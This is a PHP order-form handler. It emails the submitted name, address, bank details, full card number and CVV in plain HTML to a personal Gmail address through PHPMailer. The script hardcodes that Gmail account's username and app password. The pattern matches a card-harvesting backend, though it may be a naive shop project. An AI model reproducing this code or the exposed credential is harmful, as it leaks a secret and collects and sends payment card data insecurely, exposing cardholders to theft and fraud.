<?php
// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'src/Exception.php';
require 'src/PHPMailer.php';
require 'src/SMTP.php';

// Function to send email
function sendEmail($to, $subject, $message) {
    $mail = new PHPMailer(true); // Create a new PHPMailer instance

    try {
        // Server settings
        $mail->isSMTP(); // Set mailer to use SMTP
        $mail->Host = 'smtp.gmail.com'; // Specify main and backup SMTP servers
        $mail->SMTPAuth = true; // Enable SMTP authentication
        $mail->Username = 'zaidmeer214@gmail.com'; // Your SMTP username (Gmail address)
        $mail->Password = 'wnpn hjzm elcw ojcy'; // Your SMTP password (App Password)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Enable TLS encryption, `ssl` also accepted
        $mail->Port = 587; // TCP port to connect to

        // Recipients
        $mail->setFrom('zaidmeer214@gmail.com', 'Zaid Ahmed'); // Your email and name
        $mail->addAddress($to); // Add a recipient

        // Content
        $mail->isHTML(true); // Set email format to HTML
        $mail->Subject = $subject; // Email subject

        // Prepare email message
        $messageBody = "<h1>Order Details</h1>";
        $messageBody .= "<strong>Name:</strong> " . htmlspecialchars($_POST['name']) . "<br>";
        $messageBody .= "<strong>Email:</strong> " . htmlspecialchars($_POST['email']) . "<br>";
        $messageBody .= "<strong>Bank Details:</strong> " . htmlspecialchars($_POST['bank_details']) . "<br>";
        $messageBody .= "<strong>Address:</strong> " . htmlspecialchars($_POST['address']) . "<br>";
        $messageBody .= "<strong>Notes:</strong> " . nl2br(htmlspecialchars($_POST['notes'])) . "<br>";
        $messageBody .= "<strong>Card Number:</strong> " . htmlspecialchars($_POST['card_number']) . "<br>";
        $messageBody .= "<strong>CVV:</strong> " . htmlspecialchars($_POST['cvv']) . "<br>";
        $messageBody .= "<strong>Cart Items:</strong> " . nl2br(htmlspecialchars($_POST['cart_items'])) . "<br>";
        $messageBody .= "<strong>Total Price:</strong> $" . htmlspecialchars($_POST['total_price']) . "<br>";

        $mail->Body = $messageBody; // Email body

        $mail->send(); // Send the email
        echo 'Email sent successfully';
    } catch (Exception $e) {
        echo "Email could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}

// Check if it's a POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $to = 'zaidmeer214@gmail.com'; // Your email address where you want to receive the order details
    $subject = 'New Order Received'; // Subject for the email

    // Call the sendEmail function
    sendEmail($to, $subject, $_POST);
}
?>
